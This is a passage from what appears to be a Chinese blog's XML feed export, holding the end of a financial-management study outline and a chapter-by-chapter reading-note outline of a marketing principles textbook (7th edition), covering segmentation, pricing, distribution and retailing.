</ul>
</li>
</ul>
</li>
<li>资金成本<ul>
<li>资金成本的概念</li>
<li>个别资金成本的计算<ul>
<li>债券的资金成本</li>
<li>银行借款的资金成本</li>
<li>优先股的资金成本</li>
<li>普通股的资金成本</li>
<li>留存收益的资金成本</li>
</ul>
</li>
<li>综合资金成本</li>
</ul>
</li>
</ul>
</li>
<li>投资管理与决策<ul>
<li>投资项目的可行性研究<ul>
<li>可行性研究的步骤<ul>
<li>机会研究</li>
<li>初步可行性研究</li>
<li>详细可行性研究</li>
<li>评价和决策</li>
</ul>
</li>
<li>可行性研究的主要内容<ul>
<li>市场调查研究</li>
<li>原材料及供应的调查研究</li>
<li>厂址、布局的调杳研究</li>
<li>环境保护的调杳研究</li>
<li>项目技术设计的调查研究</li>
<li>顼目的经济评价</li>
</ul>
</li>
</ul>
</li>
<li>投资项目现金流量的估计</li>
<li>投资决策评价指标<ul>
<li>非贴现指标</li>
<li>贴现指标<ul>
<li>净现值</li>
<li>现值指数</li>
<li>内含报酬率</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>利润管理<ul>
<li>利润构成<ul>
<li>营业利润</li>
<li>投资净收益</li>
<li>营业外收支净额</li>
</ul>
</li>
<li>税金<ul>
<li>流转税类：包括增值税、消费税、营业税和城市建设维护税。</li>
<li>资源税类：包括资源税、土地使用税、土地增值税。</li>
<li>所得税类：包括企业所得税、外商投资企业和外国企业所得税、个人所得税。</li>
<li>财产税类：包括房产税、车船税、遗产和赠与税。</li>
<li>行为税类：包括固定资产投资方向调节税、印花税、证券交易税、屠宰税。</li>
</ul>
</li>
<li>利润的分配顺序</li>
<li>股利政策<ul>
<li>剩余股利政策</li>
<li>固定股利政策</li>
<li>固定比例股利政策</li>
<li>正常股利加额外分红的股利政策</li>
</ul>
</li>
</ul>
</li>
<li>财务分析<ul>
<li>偿债能力分析<ul>
<li>流动比率</li>
<li>速动比率</li>
<li>即付比率</li>
<li>资产负债率</li>
<li>净资产负债率</li>
<li>利息保障倍数</li>
</ul>
</li>
<li>营运能力分析<ul>
<li>应收账款周转率</li>
<li>流动资产周转率</li>
<li>存货周转率</li>
</ul>
</li>
<li>赢利能力分析<ul>
<li>销售利润率</li>
<li>成本费用利润率</li>
<li>净资产利润率</li>
<li>总资产利润率</li>
</ul>
</li>
<li>财务分析综合练习</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>读书笔记————市场营销学第七版</title>
    <url>/blogs/2018-10-31-readingNoteMarketing/</url>
    <content><![CDATA[<h1 id="市场营销原理第七版"><a href="#市场营销原理第七版" class="headerlink" title="市场营销原理第七版"></a>市场营销原理第七版</h1><h2 id="第一章、营销学基础"><a href="#第一章、营销学基础" class="headerlink" title="第一章、营销学基础"></a>第一章、营销学基础</h2><h3 id="营销的含义"><a href="#营销的含义" class="headerlink" title="营销的含义"></a>营销的含义</h3><ul>
<li>需要、欲望和需求</li>
<li>产品</li>
<li>价值、满意和质量</li>
<li>交换、交易和关系</li>
<li>市场</li>
<li>营销</li>
</ul>
<h3 id="营销管理"><a href="#营销管理" class="headerlink" title="营销管理"></a>营销管理</h3><ul>
<li>需求管理</li>
<li>建立互惠的顾客关系</li>
</ul>
<h3 id="营销管理哲学"><a href="#营销管理哲学" class="headerlink" title="营销管理哲学"></a>营销管理哲学</h3><ul>
<li>生产观念</li>
<li>产品观念</li>
<li>销售观念</li>
<li>营销观念</li>
<li>社会营销观念</li>
</ul>
<h3 id="下一世纪营销的挑战"><a href="#下一世纪营销的挑战" class="headerlink" title="下一世纪营销的挑战"></a>下一世纪营销的挑战</h3><ul>
<li>非盈利营销的增长</li>
<li>全球一体化进程加快</li>
<li>世界经济形势的变化</li>
<li>伦理和社会责任的强化</li>
<li>营销展望</li>
</ul>
<h3 id="案例一-“护门”-DoorGu-ard"><a href="#案例一-“护门”-DoorGu-ard" class="headerlink" title="案例一 “护门”(DoorGu ard)"></a>案例一 “护门”(DoorGu ard)</h3><h2 id="第二章、战略计划与营销过程"><a href="#第二章、战略计划与营销过程" class="headerlink" title="第二章、战略计划与营销过程"></a>第二章、战略计划与营销过程</h2><h3 id="战略计划"><a href="#战略计划" class="headerlink" title="战略计划"></a>战略计划</h3><ul>
<li>确定公司的宗旨</li>
<li>确定公司的目标</li>
</ul>
<h3 id="公司资源分配计划"><a href="#公司资源分配计划" class="headerlink" title="公司资源分配计划"></a>公司资源分配计划</h3><ul>
<li>当前业务资源分配计划分析<ul>
<li>波士顿顾问公司方法<ul>
<li>明星业务( St ar )</li>
<li>财源业务( Cash cow)</li>
<li>问题业务( Quest ion mark)</li>
<li>不利业务( Dog)</li>
</ul>
</li>
<li>通用电气公司方法</li>
<li>矩阵方法存在的问题</li>
</ul>
</li>
<li>成长型战略的发展</li>
<li>职能战略的策划<ul>
<li>在战略计划中营销部门扮演的角色</li>
<li>营销部门和其他业务职能部门</li>
<li>部门间的冲突</li>
</ul>
</li>
</ul>
<h3 id="营销过程"><a href="#营销过程" class="headerlink" title="营销过程"></a>营销过程</h3><ul>
<li>目标消费者<ul>
<li>需求测量与预测</li>
<li>市场细分</li>
<li>目标市场选择</li>
<li>市场定位</li>
</ul>
</li>
<li>确定竞争优势的营销战略</li>
<li>营销组合的发展</li>
</ul>
<h3 id="营销活动管理"><a href="#营销活动管理" class="headerlink" title="营销活动管理"></a>营销活动管理</h3><ul>
<li>营销分析</li>
<li>营销计划  <img src = "2018_11_01_01.png"></li>
<li>营销实施</li>
<li>营销部门的组织</li>
<li>营销控制  <img src = "2018_11_01_02.png">
  <img src = "2018_11_01_03.png"></li>
</ul>
<h3 id="案例二-捕鼠器"><a href="#案例二-捕鼠器" class="headerlink" title="案例二 捕鼠器"></a>案例二 捕鼠器</h3><h2 id="第三章、营销环境"><a href="#第三章、营销环境" class="headerlink" title="第三章、营销环境"></a>第三章、营销环境</h2><h3 id="公司的微观环境"><a href="#公司的微观环境" class="headerlink" title="公司的微观环境"></a>公司的微观环境</h3><ul>
<li>公司</li>
<li>供应商</li>
<li>营销中间商</li>
<li>用户</li>
<li>竞争者</li>
<li>公众<ul>
<li>金融公众( financial publics)</li>
<li>媒介公众( media publics )</li>
<li>政府公众( government publics )</li>
<li>民间公众( cit izen -action publics )</li>
<li>地方公众( local publics )</li>
<li>一般公众( general publics )</li>
<li>内部公众( internal publics)</li>
</ul>
</li>
</ul>
<h3 id="公司的宏观环境"><a href="#公司的宏观环境" class="headerlink" title="公司的宏观环境"></a>公司的宏观环境</h3><ul>
<li>人口统计环境<ul>
<li>美国人口年龄结构的变化</li>
<li>美国家庭的变化</li>
<li>人口居住区域的变化<ul>
<li>向阳光地带迁移</li>
<li>从乡村向城区迁移</li>
<li>从城市向郊区迁移</li>
</ul>
</li>
<li>更好的教育及更多的白领人口</li>
<li>伦理和种族更加多样化</li>
</ul>
</li>
<li>经济环境<ul>
<li>收入的变化</li>
<li>顾客花费方式的变化</li>
</ul>
</li>
<li>自然环境<ul>
<li>原材料短缺</li>
<li>能源成本增加</li>
<li>污染增加</li>
<li>政府对自然资源的管理</li>
</ul>
</li>
<li>技术环境<ul>
<li>技术变化的步伐</li>
<li>高开发与研究( R&amp;D) 预算</li>
<li>强调小改小革</li>
<li>法规的增加</li>
</ul>
</li>
<li>政治环境<ul>
<li>法律对工商业的制约<ul>
<li>增加立法</li>
<li>实施法规的政府部门</li>
<li>更强调伦理和社会责任</li>
</ul>
</li>
</ul>
</li>
<li>文化环境<ul>
<li>文化的持久性</li>
<li>文化的转变<ul>
<li>人们对自己的看法</li>
<li>人们对他人的看法</li>
<li>人们对组织的看法</li>
<li>人们对社会的看法</li>
<li>人们对自然的看法</li>
<li>人们对宇宙的看法</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="对营销环境的反应"><a href="#对营销环境的反应" class="headerlink" title="对营销环境的反应"></a>对营销环境的反应</h3><h3 id="案例三-捷西佩尼公司-JCPenney"><a href="#案例三-捷西佩尼公司-JCPenney" class="headerlink" title="案例三 捷西佩尼公司( JCPenney)"></a>案例三 捷西佩尼公司( JCPenney)</h3><h2 id="第四章、市场营销研究与信息系统"><a href="#第四章、市场营销研究与信息系统" class="headerlink" title="第四章、市场营销研究与信息系统"></a>第四章、市场营销研究与信息系统</h2><h3 id="营销信息系统"><a href="#营销信息系统" class="headerlink" title="营销信息系统"></a>营销信息系统</h3><ul>
<li>评估信息  <img src = "2018_11_01_04.png"></li>
<li>信息开发<ul>
<li>内部记录</li>
<li>市场营销情报</li>
<li>市场营销研究</li>
<li>信息分析</li>
</ul>
</li>
<li>信息的传送</li>
</ul>
<h3 id="市场营销研究的过程"><a href="#市场营销研究的过程" class="headerlink" title="市场营销研究的过程"></a>市场营销研究的过程</h3><ul>
<li><p>确认问题和研究目标</p>
</li>
<li><p>制定研究计划</p>
<ul>
<li>详细确认所需信息</li>
<li>收集间接信息  <img src = "2018_11_01_05.png"></li>
<li>安排收集直接数据  <img src = "2018_11_01_06.png">
  <img src = "2018_11_01_07.png">
  <img src = "2018_11_01_08.png"></li>
</ul>
</li>
<li><p>执行研究计划</p>
</li>
<li><p>解释和报告研究成果</p>
</li>
<li><p>市场营销研究的其他方面</p>
<ul>
<li>小型企业和非盈利组织的营销研究</li>
<li>国际市场营销研究</li>
<li>市场营销研究中的公共政策和伦理问题</li>
</ul>
</li>
</ul>
<h3 id="案例四-电器控制设备市场"><a href="#案例四-电器控制设备市场" class="headerlink" title="案例四 电器控制设备市场"></a>案例四 电器控制设备市场</h3><h2 id="第五章、消费者市场与消费品购买者行为"><a href="#第五章、消费者市场与消费品购买者行为" class="headerlink" title="第五章、消费者市场与消费品购买者行为"></a>第五章、消费者市场与消费品购买者行为</h2><h3 id="消费者行为模式"><a href="#消费者行为模式" class="headerlink" title="消费者行为模式"></a>消费者行为模式</h3><h3 id="影响消费者行为的因素"><a href="#影响消费者行为的因素" class="headerlink" title="影响消费者行为的因素"></a>影响消费者行为的因素</h3><ul>
<li>文化因素<ul>
<li>文化</li>
<li>亚文化<ul>
<li>拉丁美洲消费者</li>
<li>黑人消费者</li>
<li>成熟消费者</li>
</ul>
</li>
<li>社会阶层</li>
</ul>
</li>
<li>社会因素<ul>
<li>群体</li>
<li>家庭</li>
<li>作用与地位</li>
</ul>
</li>
<li>个人因素<ul>
<li>年龄和生活周期  <img src = "2018_11_02_09.png"></li>
<li>职业</li>
<li>经济状况</li>
<li>生活方式<ul>
<li>现实者</li>
<li>成就者</li>
<li>诚信者</li>
<li>成功者</li>
<li>努力者</li>
<li>体验者</li>
<li>创造者</li>
<li>奋斗者</li>
</ul>
</li>
<li>个性和自我意念</li>
</ul>
</li>
<li>心理因素<ul>
<li>激励</li>
<li>感觉</li>
<li>学习</li>
<li>信任和态度</li>
</ul>
</li>
</ul>
<h3 id="消费者购买角色"><a href="#消费者购买角色" class="headerlink" title="消费者购买角色"></a>消费者购买角色</h3><ul>
<li>启动者</li>
<li>影响者</li>
<li>决策者</li>
<li>购买者</li>
<li>使用者</li>
</ul>
<h3 id="购买决策行为的种类"><a href="#购买决策行为的种类" class="headerlink" title="购买决策行为的种类"></a>购买决策行为的种类</h3><ul>
<li>复杂购买行为</li>
<li>消除差异购买行为</li>
<li>习惯性购买行为</li>
<li>广泛挑选购买行为</li>
</ul>
<h3 id="购买者决策过程"><a href="#购买者决策过程" class="headerlink" title="购买者决策过程"></a>购买者决策过程</h3><ul>
<li>确认需要</li>
<li>搜索信息<ul>
<li>个人来源: 家庭、朋友、邻居和熟人。</li>
<li>商业来源: 广告、销售人员、商店、包装和展示。</li>
<li>公共来源: 大众传媒和消费者协会。</li>
<li>试验来源: 搬运、检查和使用产品。</li>
</ul>
</li>
<li>评估选择</li>
<li>购买决定</li>
<li>购后行为</li>
</ul>
<h3 id="新产品的购买决策过程"><a href="#新产品的购买决策过程" class="headerlink" title="新产品的购买决策过程"></a>新产品的购买决策过程</h3><ul>
<li>接受过程的几个阶段<ul>
<li>知晓: 消费者知道了新产品, 但缺少有关信息</li>
<li>兴趣: 消费者寻找关于新产品的信息</li>
<li>试验: 消费者小规模试用新产品, 调整他或她对新产品的看法</li>
<li>接受: 消费者决定充分地或常规地使用新产品</li>
</ul>
</li>
<li>个人接受创新时的差异</li>
<li>产品特点对接受率的影响<ul>
<li>优势程度: 与已有产品相比, 新发明表现的优良程度</li>
<li>匹配程度: 新产品与潜在消费者的价值观或经验是否一致</li>
<li>复杂程度: 弄懂或使用新产品的难度</li>
<li>可分程度: 人们是否有多种方法来购买新产品</li>
<li>交流程度: 人们使用新产品后, 能否看到新产品的优点并告诉他人</li>
</ul>
</li>
</ul>
<h3 id="国际消费者行为"><a href="#国际消费者行为" class="headerlink" title="国际消费者行为"></a>国际消费者行为</h3><h3 id="案例五-重新想想未来"><a href="#案例五-重新想想未来" class="headerlink" title="案例五 重新想想未来"></a>案例五 重新想想未来</h3><h2 id="第六章、集团市场与集团购买者行为"><a href="#第六章、集团市场与集团购买者行为" class="headerlink" title="第六章、集团市场与集团购买者行为"></a>第六章、集团市场与集团购买者行为</h2><h3 id="集团市场"><a href="#集团市场" class="headerlink" title="集团市场"></a>集团市场</h3><ul>
<li>集团购买的特点<ul>
<li>市场结构与需求</li>
<li>购买产品的性质</li>
<li>决策类型和决策过程</li>
<li>集团市场的其他特点</li>
</ul>
</li>
<li>集团购买者的行为模式</li>
</ul>
<h3 id="集团购买行为"><a href="#集团购买行为" class="headerlink" title="集团购买行为"></a>集团购买行为</h3><ul>
<li>购买情况的种类</li>
<li>集团购买过程中的参加者<ul>
<li>使用者( Users)</li>
<li>影响者( Inf luencer )</li>
<li>购买者( Buyer )</li>
<li>决策者(Deciders )</li>
<li>挡驾者(Gatekeepers )</li>
</ul>
</li>
<li>影响集团购买者的主要因素<ul>
<li>环境因素</li>
<li>组织因素<ul>
<li>采购部门升级</li>
<li>集中购买</li>
<li>长期合同</li>
<li>购买工作评估</li>
<li>适时的生产系统</li>
</ul>
</li>
<li>人际因素</li>
<li>个人因素</li>
</ul>
</li>
<li>集团购买过程  <img src = "2018_11_04_23.png"></li>
</ul>
<h3 id="机构和政府市场"><a href="#机构和政府市场" class="headerlink" title="机构和政府市场"></a>机构和政府市场</h3><ul>
<li>机构市场</li>
<li>政府市场<ul>
<li>影响政府购买者的主要因素</li>
<li>政府购买者决策过程</li>
</ul>
</li>
</ul>
<h3 id="案例六-控制行业市场"><a href="#案例六-控制行业市场" class="headerlink" title="案例六 控制行业市场"></a>案例六 控制行业市场</h3><h2 id="第七章、测量与预测需求"><a href="#第七章、测量与预测需求" class="headerlink" title="第七章、测量与预测需求"></a>第七章、测量与预测需求</h2><h3 id="市场的定义"><a href="#市场的定义" class="headerlink" title="市场的定义"></a>市场的定义</h3><h3 id="当前市场需求的测量"><a href="#当前市场需求的测量" class="headerlink" title="当前市场需求的测量"></a>当前市场需求的测量</h3><ul>
<li>估计市场总需求</li>
<li>估计地区市场需求<ul>
<li>市场构成法</li>
<li>市场因素指数法</li>
</ul>
</li>
<li>估计实际销售量和市场份额</li>
</ul>
<h3 id="预测未来需求"><a href="#预测未来需求" class="headerlink" title="预测未来需求"></a>预测未来需求</h3><img src = "2018_11_02_10.png">
* 购买者意向调查
* 综合销售人员意见
* 听取专家意见
* 测试市场
* 时间序列分析
* 前兆因素分析
* 统计需求分析法

<h3 id="案例七-预测孩子玩什么"><a href="#案例七-预测孩子玩什么" class="headerlink" title="案例七 预测孩子玩什么"></a>案例七 预测孩子玩什么</h3><h2 id="第八章、市场细分下的目标市场与优势定位"><a href="#第八章、市场细分下的目标市场与优势定位" class="headerlink" title="第八章、市场细分下的目标市场与优势定位"></a>第八章、市场细分下的目标市场与优势定位</h2><h3 id="市场"><a href="#市场" class="headerlink" title="市场"></a>市场</h3><ul>
<li>广泛营销</li>
<li>多产品营销</li>
<li>目标市场营销</li>
</ul>
<h3 id="市场细分"><a href="#市场细分" class="headerlink" title="市场细分"></a>市场细分</h3><ul>
<li>消费者市场细分的基础<ul>
<li>地理细分</li>
<li>人口细分<ul>
<li>年龄和生活周期</li>
<li>性别</li>
<li>收入</li>
<li>多因素人口细分</li>
</ul>
</li>
<li>心理细分<ul>
<li>社会阶层</li>
<li>生活方式</li>
<li>个性</li>
</ul>
</li>
<li>行为细分<ul>
<li>购买时机</li>
<li>寻求的利益</li>
<li>使用者情况</li>
<li>使用率</li>
<li>品牌崇信度</li>
</ul>
</li>
</ul>
</li>
<li>集团市场细分  <img src = "2018_11_04_22.png">
  * 计划中的购买者
  * 关系中的购买者
  * 交易中的购买者
  * 讨价还价的购买者</li>
<li>国际市场细分</li>
<li>有效细分的要求<ul>
<li>可测量性</li>
<li>可接近性</li>
<li>实质性</li>
<li>可行性</li>
</ul>
</li>
</ul>
<h3 id="确定目标市场"><a href="#确定目标市场" class="headerlink" title="确定目标市场"></a>确定目标市场</h3><ul>
<li>评估子市场<ul>
<li>子市场的规模与发展</li>
<li>子市场结构优势</li>
<li>公司的目标和资源</li>
</ul>
</li>
<li>选择子市场<ul>
<li>无差异性营销</li>
<li>差异性营销</li>
<li>集中式营销</li>
<li>选择市场覆盖策略</li>
</ul>
</li>
</ul>
<h3 id="优势市场定位"><a href="#优势市场定位" class="headerlink" title="优势市场定位"></a>优势市场定位</h3><ul>
<li>什么是市场定位</li>
<li>定位策略</li>
<li>选择和实施定位策略<ul>
<li>确定可能的竞争优势<ul>
<li>产品差异</li>
<li>服务差异</li>
<li>人员差异</li>
<li>形象差异</li>
</ul>
</li>
<li>选择正确的竞争优势<ul>
<li>需要展示的差异</li>
<li>选择需要促销的差异<ul>
<li>重要程度: 差异对目标购买者来说是非常有价值的。</li>
<li>明显程度: 竞争者没有的产品或服务, 或公司在这两方面有明显优势。</li>
<li>优质程度: 顾客可以获得最好的质量。</li>
<li>交流程度: 差异有可交流性, 并且消费者可以看见差异。</li>
<li>专门性: 竞争者不能轻易地模仿制造。</li>
<li>购买力: 购买者买得起有优势的产品。</li>
<li>盈利性: 公司的差异可带来利润。  <img src = "2018_11_02_11.png"></li>
</ul>
</li>
<li>定位交流与传递</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="案例八-饮料市场的竞争"><a href="#案例八-饮料市场的竞争" class="headerlink" title="案例八 饮料市场的竞争"></a>案例八 饮料市场的竞争</h3><h2 id="第九章、产品综合设计"><a href="#第九章、产品综合设计" class="headerlink" title="第九章、产品综合设计"></a>第九章、产品综合设计</h2><h3 id="什么是产品"><a href="#什么是产品" class="headerlink" title="什么是产品"></a>什么是产品</h3><h3 id="产品分类"><a href="#产品分类" class="headerlink" title="产品分类"></a>产品分类</h3><ul>
<li>消费品  <img src = "2018_11_02_12.png"></li>
<li>工业品</li>
</ul>
<h3 id="产品决策"><a href="#产品决策" class="headerlink" title="产品决策"></a>产品决策</h3><ul>
<li>产品属性<ul>
<li>产品质量</li>
<li>产品特征</li>
<li>产品设计</li>
</ul>
</li>
<li>品牌策略<ul>
<li>什么是品牌<ul>
<li>属性: 品牌首先把产品的属性带给人们</li>
<li>利益: 客户购买的不是产品属性, 而是利益</li>
<li>价值: 品牌也可以反映购买者的价值观,</li>
<li>个性: 品牌也能揭示人们的个性</li>
</ul>
</li>
<li>品牌价值</li>
<li>是否要品牌</li>
<li>品牌名称的选择</li>
<li>品牌所有者<ul>
<li>制造商品牌与销售商品牌</li>
<li>许可证策略</li>
<li>联合品牌策略</li>
</ul>
</li>
<li>品牌策略<ul>
<li>产品延伸策略</li>
<li>品牌延伸策略</li>
<li>多品牌策略</li>
<li>新品牌策略</li>
</ul>
</li>
<li>品牌重新定位</li>
</ul>
</li>
<li>包装策略</li>
<li>标签策略</li>
<li>产品维修服务</li>
</ul>
<h3 id="产品系列决策"><a href="#产品系列决策" class="headerlink" title="产品系列决策"></a>产品系列决策</h3><ul>
<li>产品系列的规模<ul>
<li>下行延伸法</li>
<li>上行延伸法</li>
<li>双向延伸法</li>
<li>增加产品系列</li>
</ul>
</li>
<li>更新产品系列</li>
<li>产品系列的重点</li>
</ul>
<h3 id="产品组合决策"><a href="#产品组合决策" class="headerlink" title="产品组合决策"></a>产品组合决策</h3><h3 id="国际产品决策"><a href="#国际产品决策" class="headerlink" title="国际产品决策"></a>国际产品决策</h3><h3 id="案例九-从品牌名称中挤出更多的东西"><a href="#案例九-从品牌名称中挤出更多的东西" class="headerlink" title="案例九 从品牌名称中挤出更多的东西"></a>案例九 从品牌名称中挤出更多的东西</h3><h2 id="第十章、新产品设计"><a href="#第十章、新产品设计" class="headerlink" title="第十章、新产品设计"></a>第十章、新产品设计</h2><h3 id="新产品开发策略"><a href="#新产品开发策略" class="headerlink" title="新产品开发策略"></a>新产品开发策略</h3><ul>
<li>新产品的成功与失败</li>
<li>新产品的困境  <img src = "2018_11_04_21.png"></li>
</ul>
<h3 id="新产品开发过程"><a href="#新产品开发过程" class="headerlink" title="新产品开发过程"></a>新产品开发过程</h3><ul>
<li>设计思想的产生<ul>
<li>内部来源</li>
<li>客户</li>
<li>竞争者</li>
<li>分销商、供应商和其他</li>
</ul>
</li>
<li>设计思想的筛选</li>
<li>设计思想的开发与检验<ul>
<li>设计思想的开发</li>
<li>设计思想的测试</li>
</ul>
</li>
<li>市场营销策略的开发</li>
<li>产品经营分析</li>
<li>产品的开发</li>
<li>市场营销测试<ul>
<li>标准市场测试</li>
<li>限定性市场测试</li>
<li>模拟性市场测试</li>
<li>集团产品的市场测试</li>
</ul>
</li>
<li>产品的商业推广</li>
<li>加速新产品开发</li>
</ul>
<h3 id="产品生命周期策略"><a href="#产品生命周期策略" class="headerlink" title="产品生命周期策略"></a>产品生命周期策略</h3><ul>
<li>第一阶段: 开发期从公司找到和开发一种新产品的设计思想开始</li>
<li>第二阶段: 在新生期, 产品刚刚推到市场上, 销售缓慢增长</li>
<li>第三阶段: 在成长期, 市场迅速认可产品, 利润剧增</li>
<li>第四阶段: 在成熟期, 许多潜在消费者已经购买了这种产品, 销售增长渐缓<ul>
<li>调整市场</li>
<li>调整产品</li>
<li>调整营销组合策略</li>
</ul>
</li>
<li>第五阶段: 衰退期里, 销售和利润下降<img src = "2018_11_02_13.png"></li>
</ul>
<h3 id="案例十-把梦幻推向市场"><a href="#案例十-把梦幻推向市场" class="headerlink" title="案例十 把梦幻推向市场"></a>案例十 把梦幻推向市场</h3><h2 id="第十一章、产品定价"><a href="#第十一章、产品定价" class="headerlink" title="第十一章、产品定价"></a>第十一章、产品定价</h2><h3 id="定价时需考虑的因素"><a href="#定价时需考虑的因素" class="headerlink" title="定价时需考虑的因素"></a>定价时需考虑的因素</h3><ul>
<li>影响定价决策的内部因素<ul>
<li>市场营销目标</li>
<li>市场营销组合策略</li>
<li>成本<ul>
<li>成本的种类<ul>
<li>固定成本</li>
<li>变动成本</li>
</ul>
</li>
<li>不同生产水平下的成本</li>
<li>生产经验下的成本函数</li>
</ul>
</li>
<li>组织方面的考虑</li>
</ul>
</li>
<li>影响定价策略的外部因素<ul>
<li>市场与需求<ul>
<li>不同市场中的定价</li>
<li>消费者对价格和价值的看法</li>
<li>分析“价格—需求”关系</li>
<li>需求的价格弹性</li>
</ul>
</li>
<li>竞争者的成本、价格和条件</li>
<li>其他外部因素</li>
</ul>
</li>
</ul>
<h3 id="一般的定价方法"><a href="#一般的定价方法" class="headerlink" title="一般的定价方法"></a>一般的定价方法</h3><ul>
<li>基于成本的定价法<ul>
<li>成本加成定价法</li>
<li>盈亏平衡定价法和目标利润定价法</li>
</ul>
</li>
<li>基于价值的定价法</li>
<li>基于竞争的定价<ul>
<li>行市定价法</li>
<li>封标定价法</li>
</ul>
</li>
</ul>
<h3 id="案例十一-机票价格战中余生"><a href="#案例十一-机票价格战中余生" class="headerlink" title="案例十一 机票价格战中余生"></a>案例十一 机票价格战中余生</h3><h2 id="第十二章、定价策略"><a href="#第十二章、定价策略" class="headerlink" title="第十二章、定价策略"></a>第十二章、定价策略</h2><h3 id="新产品定价策略"><a href="#新产品定价策略" class="headerlink" title="新产品定价策略"></a>新产品定价策略</h3><ul>
<li>撇脂式定价法</li>
<li>渗透式定价法</li>
</ul>
<h3 id="产品组合定价策略"><a href="#产品组合定价策略" class="headerlink" title="产品组合定价策略"></a>产品组合定价策略</h3><img src = "2018_11_02_14.png">

<h3 id="价格调整策略"><a href="#价格调整策略" class="headerlink" title="价格调整策略"></a>价格调整策略</h3><img src = "2018_11_02_15.png">

<h3 id="价格变动"><a href="#价格变动" class="headerlink" title="价格变动"></a>价格变动</h3><ul>
<li>主动变动价格<ul>
<li>主动降低价格</li>
<li>主动提高价格</li>
<li>购买者对价格变动的反应</li>
<li>竞争者对价格变动的反应</li>
</ul>
</li>
<li>价格变动的对策</li>
</ul>
<h3 id="案例十二-只卖音响-卖二手车也成功"><a href="#案例十二-只卖音响-卖二手车也成功" class="headerlink" title="案例十二 只卖音响? 卖二手车也成功"></a>案例十二 只卖音响? 卖二手车也成功</h3><h2 id="第十三章、分销产品"><a href="#第十三章、分销产品" class="headerlink" title="第十三章、分销产品"></a>第十三章、分销产品</h2><h3 id="分销渠道的性质"><a href="#分销渠道的性质" class="headerlink" title="分销渠道的性质"></a>分销渠道的性质</h3><ul>
<li>为什么要有营销中介</li>
<li>分销渠道的职能<ul>
<li>信息: 收集和发布各单位市场研究和情报方面的信息, 这些信息对适应环境,进行计划和调整很有必要。</li>
<li>促销: 开发和发布有关广告信息。</li>
<li>交流: 寻找并与潜在消费者进行交流。</li>
<li>调整: 为适应消费者进行调整, 包括制造、定级、组装和包装。</li>
<li>谈判: 达成有关价格、产品、服务的协议, 完成所有权或使用权的转换。</li>
<li>实体分销: 运输和储存货物。</li>
<li>财务业务: 获得和使用资金, 补偿分销渠道的成本。</li>
<li>承担风险: 承担分销渠道工作的风险。</li>
</ul>
</li>
<li>渠道层次的数量</li>
<li>服务领域的分销渠道</li>
</ul>
<h3 id="分销渠道行为和组织"><a href="#分销渠道行为和组织" class="headerlink" title="分销渠道行为和组织"></a>分销渠道行为和组织</h3><ul>
<li>分销渠道行为</li>
<li>垂直营销系统<ul>
<li>统一垂直营销系统</li>
<li>契约垂直营销系统</li>
<li>管理垂直营销系统</li>
</ul>
</li>
<li>水平营销系统</li>
<li>混合营销系统</li>
</ul>
<h3 id="分销渠道设计决策"><a href="#分销渠道设计决策" class="headerlink" title="分销渠道设计决策"></a>分销渠道设计决策</h3><ul>
<li>分析消费者在服务方面的需要</li>
<li>制定分销渠道目标和限制条件</li>
<li>确认主要的分销渠道选择<ul>
<li>中间商的种类<ul>
<li>公司销售队伍: 扩大公司的直销队伍。</li>
<li>制造商的代理商: 雇佣制造商的代理商</li>
<li>工业分销商: 在不同地区和行业找到分销商</li>
</ul>
</li>
<li>市场营销中间商的数量</li>
<li>渠道成员的责任</li>
</ul>
</li>
<li>评估主要的分销渠道<ul>
<li>经济标准</li>
<li>控制标准</li>
<li>适应性标准</li>
</ul>
</li>
<li>设计国际分销渠道</li>
</ul>
<h3 id="分销渠道管理决策"><a href="#分销渠道管理决策" class="headerlink" title="分销渠道管理决策"></a>分销渠道管理决策</h3><ul>
<li>选择分销渠道成员</li>
<li>激励分销渠道成员</li>
<li>评估分销渠道成员</li>
</ul>
<h3 id="实体分销和后勤管理"><a href="#实体分销和后勤管理" class="headerlink" title="实体分销和后勤管理"></a>实体分销和后勤管理</h3><ul>
<li>实体分销和市场营销后勤的性质和重要性</li>
<li>后勤系统的目标</li>
<li>主要后勤职能<ul>
<li>订货处理</li>
<li>仓库管理</li>
<li>仓储</li>
<li>运输<ul>
<li>铁路</li>
<li>卡车</li>
<li>水路</li>
<li>管线</li>
<li>航空</li>
</ul>
</li>
</ul>
</li>
<li>集中后勤管理<ul>
<li>跨部门的小组工作</li>
<li>建立渠道合作关系</li>
</ul>
</li>
</ul>
<h3 id="案例十三-超越传统"><a href="#案例十三-超越传统" class="headerlink" title="案例十三 超越传统"></a>案例十三 超越传统</h3><h2 id="第十四章、出售产品——零售及批发"><a href="#第十四章、出售产品——零售及批发" class="headerlink" title="第十四章、出售产品——零售及批发"></a>第十四章、出售产品——零售及批发</h2><h3 id="零售业"><a href="#零售业" class="headerlink" title="零售业"></a>零售业</h3><h3 id="店铺零售业"><a href="#店铺零售业" class="headerlink" title="店铺零售业"></a>店铺零售业</h3><img src = "2018_11_04_16.png">

<h3 id="无店铺零售业"><a href="#无店铺零售业" class="headerlink" title="无店铺零售业"></a>无店铺零售业</h3><ul>
<li>直接市场营销</li>
<li>直接推销</li>
<li>自动售货</li>
</ul>
<h3 id="零售商市场营销决策"><a href="#零售商市场营销决策" class="headerlink" title="零售商市场营销决策"></a>零售商市场营销决策</h3><ul>
<li>目标市场和定位决策</li>
<li>产品分类和服务决策</li>
<li>价格决策</li>
<li>促销决策</li>
<li>地点决策</li>
</ul>
<h3 id="零售业的未来"><a href="#零售业的未来" class="headerlink" title="零售业的未来"></a>零售业的未来</h3><h3 id="批发业"><a href="#批发业" class="headerlink" title="批发业"></a>批发业</h3><ul>
<li>销售和促销。批发商的推销人员帮助制造商以低费用接触到任何小的顾客。批发商有更多的联系并且往往比起遥远的制造商更为购买者所信任。</li>
<li>购买和分类。批发商能选择项目并建立他们的顾客所需要的分类, 因此节省消费者许多工作。</li>
<li>大批量分割。批发商凭借购买整车货物并分割批量( 将大批量分成小数量) 以节省顾客的钱。</li>
<li>仓储。批发商保管存货, 因此降低供应商和顾客的存货费用和风险。</li>
<li>交通。批发商能更快地将货物交给购买者, 因为他们比生产者更接近些。</li>
<li>融资。批发商为顾客提供信贷给予他们资金, 他们并提前订货和准时付款来为供应商筹措资金。</li>
